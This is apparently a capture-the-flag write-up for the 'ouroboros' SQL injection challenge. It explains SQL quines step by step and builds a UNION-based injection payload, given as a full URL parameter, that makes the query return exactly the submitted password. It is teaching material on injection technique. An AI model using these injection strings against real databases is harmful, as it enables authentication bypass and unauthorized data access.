---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 30
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/1484f622-d41c-4263-9655-405d71ed15d5)

We are provided with the SQL query:

```sql
SELECT pw FROM prob_ouroboros WHERE pw='{$_GET[pw]}'
```

If `$result['pw']` is equal `$_GET['pw']`, the challenge is solved.

If we provide the following URI parameter:

```
?pw=' UNION SELECT 1 -- -
```

The resultant query becomes:

```sql
SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT 1 -- -'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/33c02c9b-464c-4920-b0aa-4d463a1bc01c)

In this case the `$result['pw']` and `$_GET['pw']` differ as follows:

```
$result['pw']: 1
$_GET['pw']: ' UNION SELECT 1 -- -
```

In order to make them the same, we have to use a [Quine](https://en.wikipedia.org/wiki/Quine_(computing)) program.

&nbsp;

## Quine

A Quine is a program that outputs its own souce code without having access to it.
An example of a SQL Quine is:

```sql
SELECT Replace(Replace(
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine',
Char(34),Char(39)),Char(36),
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine')
AS Quine 
```
### Initial string

```sql
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine'
```
### First replacement

```sql
-- - SELECT Replace( -- -
Replace( 
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine', 
Char(34), 
Char(39)
)
-- - , Char(36), 'SELECT REPLACE(REPLACE("$",Char(34),Char(39)),Char(36),"$") AS Quine') AS Quine -- -
```

Replace all occurrences of `Char(34)` (double quote `"` Character) with `Char(39)` (single quote `'` Character):

```sql
-- - SELECT Replace( -- -
'SELECT Replace(Replace(\'$\',Char(34),Char(39)),Char(36),\'$\') AS Quine'
-- - , Char(36), 'SELECT REPLACE(REPLACE("$",Char(34),Char(39)),Char(36),"$") AS Quine') AS Quine -- -
```
### Second replacement

```sql
-- - SELECT -- -
Replace(
'SELECT Replace(Replace('$',Char(34),Char(39)),Char(36),'$') AS Quine', 
Char(36),
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine'
)
-- - AS Quine -- -
```

Replace all occurrences of `Char(36)` (dollar sign `$` Character) with the original string:

```sql
-- - SELECT -- -
'SELECT Replace(Replace(
\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\',
Char(34),Char(39)),Char(36),
\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\')
AS Quine'
-- - AS Quine -- -
```
### Putting it All Together

The final result of the query is the string after both replacements, as follows:

```sql
SELECT
'SELECT Replace(Replace(
\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\',
Char(34), Char(39)), Char(36),
\'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine\')
AS Quine'
AS Quine
```

When this SQL query is executed, it will produce a single column named `Quine` containing the following text:

```sql
SELECT Replace(Replace(
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine',
Char(34), Char(39)), Char(36),
'SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") AS Quine')
AS Quine
```

Thus, we can see how the query repeats itself.

&nbsp;
## Modified Quine

```sql
' UNION SELECT Replace(Replace(
'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23',
Char(34),Char( 39)),Char(36), 
'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23')
%23
```
### First replacement

```sql
-- - ' UNION SELECT Replace( -- -
Replace(
'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23',
Char(34),
Char(39)
)
-- -,Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23')%23 -- -
```

Replace all occurrences of `Char(34)` (double quote `"` Character) with `Char(39)` (single quote `'` Character):

```sql
-- - ' UNION SELECT Replace( -- -
'\' UNION SELECT Replace(Replace(\'$\',Char(34),Char(39)),Char(36),\'$\')%23'
-- -,Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23')%23 -- -
```
### Second replacement

```sql
-- - ' UNION SELECT -- -
Replace(
'\' UNION SELECT Replace(Replace('$',Char(34),Char(39)),Char(36),'$')%23',
Char(36),
'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23')
-- - %23 -- -
```

Replace all occurrences of `Char(36)` (dollar sign `$` Character) with the original string:

```sql
-- - ' UNION SELECT -- -
'\' UNION SELECT Replace(Replace(
\'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23\'
,Char(34),Char(39)),Char(36),
\'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23\'
)%23'
-- - %23 -- -
```
### Putting it all together

The final result of the query is the string after both replacements, as follows:

```sql
' UNION SELECT 
\'\' UNION SELECT Replace(Replace(
\'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23\'
,Char(34),Char(39)),Char(36),
\'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23\'
)%23'
%23
```

When this SQL query is executed, it will return the following text:

```sql
' UNION SELECT Replace(Replace(
'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23',
Char(34),Char(39)),Char(36),
'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$")%23'
)%23
```

We have successfully managed to create a Quine to solve this challenge.

&nbsp;

Now, we have to implement this for the challenge.
We will have to modify this Quine to the following:

```sql
UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -',Char(34),Char( 39)),Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -') -- -
```

If we provide the following URI parameter:

```
?pw=' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -',Char(34),Char( 39)),Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -') -- -
```

The resultant query becomes:

```sql
SELECT pw FROM prob_ouroboros WHERE pw='' UNION SELECT Replace(Replace('" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -',Char(34),Char( 39)),Char(36),'" UNION SELECT Replace(Replace("$",Char(34),Char(39)),Char(36),"$") -- -') -- -'
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/2022ca1c-e568-4989-aa51-186eaacd6810)
